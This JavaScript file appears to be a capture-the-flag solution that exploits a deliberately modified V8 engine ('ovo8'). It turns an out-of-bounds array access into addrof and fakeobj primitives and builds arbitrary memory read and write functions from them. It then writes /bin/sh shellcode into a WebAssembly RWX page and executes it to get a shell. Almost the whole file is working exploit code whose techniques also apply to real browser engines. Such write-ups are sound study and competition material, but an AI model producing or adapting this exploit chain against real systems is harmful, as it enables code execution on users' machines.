const i64 = new BigInt64Array(1);
const f64 = new Float64Array(i64.buffer);

// helper function
function ftoi(x) {
  f64[0] = x;
  return i64[0];
}

function itof(x) {
  i64[0] = x;
  return f64[0];
}

function hex(i) {
  return "0x" + i.toString(16);
}

const a = Array(87);
const b = [87.63, 35.35, 12.34]; // JSArray with FixedDoubleArray

// %DebugPrint(b);
// %SystemBreak();
// a[89] = {};
// %DebugPrint(b);
// %SystemBreak();

function addrof(obj) {
  a[89] = obj;
  return ftoi(b[0]) & 0xffffffffn;
}

// let obj = { a: 1 }
// console.log(hex(addrof(obj)));
// %SystemBreak();

function fakeobj(addr) {
  b[0] = itof(addr);
  return a[89];
}

// console.log(fakeobj(addrof({ a: { b: "peko" } })).a.b);

// %DebugPrint(a);
// %SystemBreak();

const map_addr = ftoi(b[3]) & 0xffffffffn;
console.log("map_addr", hex(map_addr));

const data = [itof(map_addr), 1.1, 2.2, 3.3];

// data[1] = itof(addrof(a) | (0x87638763n << 32n));
// addrof(data) - 0x28n is the address of elements
// +8n to use its content as fake array
console.log("fake", hex(addrof(data) - 0x28n + 8n));
// %DebugPrint(data);
// %SystemBreak();

const fake = fakeobj(addrof(data) - 0x20n);
// %DebugPrint(fake);

function read64(addr) {
  // 2n << 32n is to ensure the fake array has length 1 (SMI)
  data[1] = itof((addr - 8n) | 1n | (2n << 32n));
  return ftoi(fake[0]);
}

function write64(addr, val) {
  // 2n << 32n is to ensure the fake array has length 1 (SMI)
  data[1] = itof((addr - 8n) | 1n | (2n << 32n));
  fake[0] = itof(val);
  return ftoi(fake[0]);
}

// const tmp = [8.7, 6.3, 8.7, 6.3, 8.7, 6.3];
// const addrtmp = addrof(tmp);
// console.log("tmp", hex(addrtmp));
// console.log(hex(read64(addrtmp)));
// %DebugPrint(tmp);
// %SystemBreak();
// console.log(hex(write64(addrtmp, 0xdeadbeefn)));
// console.log(hex(read64(addrtmp)));
// %DebugPrint(tmp);
// %SystemBreak();

// create rwx page
const bytes = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 144, 128, 128, 128,
  0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 3, 112, 119, 110, 0, 0, 10, 138,
  128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
]);
const mod = new WebAssembly.Module(bytes);
const instance = new WebAssembly.Instance(mod);

const rwx_page = read64(addrof(instance) + 0x60n);
console.log("rwx_page", hex(rwx_page));

const buf = new ArrayBuffer(0x100);
write64(addrof(buf) + 28n, rwx_page); // write address of rwx page to backing store

const view = new Uint8Array(buf);

// generated by pwntools asm(shellcraft.sh())
const shellcode = [
  106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104,
  114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230,
  86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5,
];
for (let i = 0; i < shellcode.length; i++) {
  view[i] = shellcode[i];
}

// %DebugPrint(buf);
// %SystemBreak();

const pwn = instance.exports.pwn;
pwn();

// run with: dist/ovo8/d8 solve.js
